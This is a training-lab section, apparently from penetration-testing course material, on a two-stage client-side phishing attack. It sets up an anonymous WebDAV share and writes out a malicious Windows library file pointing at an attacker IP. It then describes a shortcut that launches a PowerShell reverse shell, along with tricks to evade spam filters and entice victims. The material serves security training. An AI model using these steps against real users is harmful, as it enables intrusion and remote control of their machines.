### Two-Stage Client-Side Attack

In this section, we will execute a two-stage client-side attack. The first stage involves using a Windows library file to gain initial access to the target system and set up the second stage. In the second stage, we will use the foothold to deliver an executable file that initiates a reverse shell when double-clicked.

#### First Stage: Gaining Initial Access

1. **Creating the Windows Library File**:
   - We will create a Windows library file (`.Library-ms`) that connects to a WebDAV share.
   - The victim will receive the `.Library-ms` file, possibly via email.
   - When the victim double-clicks the file, it will appear as a regular directory in Windows Explorer.
   - In the WebDAV directory, we will place a payload in the form of a `.lnk` shortcut file, which will execute a PowerShell reverse shell.
   - To ensure the payload is executed, we need to convince the user to double-click the `.lnk` file.

2. **Advantages of Using Windows Library Files**:
   - Most spam filters and security technologies allow Windows library files to pass through to the user.
   - When the user double-clicks the file, Windows Explorer displays the contents of the remote location as if it were a local directory.
   - This makes it seem like the user is interacting with a local file, increasing the likelihood of successful execution.

3. **Setting Up the WebDAV Share**:
   - We will set up a WebDAV share on our Kali Linux system using WsgiDAV.
   - Install WsgiDAV using pip3:
     ```bash
     kali@kali:~$ pip3 install wsgidav
     ```
   - Create the `/home/kali/webdav` directory and place a `test.txt` file in it.
   - Start the WsgiDAV server:
     ```bash
     kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
     ```

4. **Creating the Library File**:
   - Connect to the target machine (CLIENT137) using RDP with the credentials `offsec`/`lab`.
   - Use Visual Studio Code to create the library file.
   - Save the file as `config.Library-ms` on the desktop.
   - Modify the XML content of the library file to include the necessary tags and settings:
     ```xml
     <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
         <name>@windows.storage.dll,-34582</name>
         <version>6</version>
         <isLibraryPinned>true</isLibraryPinned>
         <iconReference>imageres.dll,-1003</iconReference>
         <templateInfo>
             <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
         </templateInfo>
         <searchConnectorDescriptionList>
             <searchConnectorDescription>
                 <isDefaultSaveLocation>true</isDefaultSaveLocation>
                 <isSupported>false</isSupported>
                 <simpleLocation>
                     <url>http://192.168.119.2</url>
                 </simpleLocation>
             </searchConnectorDescription>
         </searchConnectorDescriptionList>
     </libraryDescription>
     ```
   - Save and close the file, then double-click it to verify it works correctly.

#### Second Stage: Delivering the Payload

1. **Creating the Shortcut File**:
   - Place a `.lnk` shortcut file on the WebDAV share.
   - The `.lnk` file should point to a PowerShell script or executable that initiates a reverse shell.
   - Ensure the `.lnk` file is named and placed in a way that entices the user to double-click it.

2. **Executing the Payload**:
   - When the user double-clicks the `.lnk` file, it will execute the PowerShell script or executable, initiating the reverse shell.

By following these steps, we can successfully perform a two-stage client-side attack, gaining initial access and delivering a payload to establish a reverse shell.
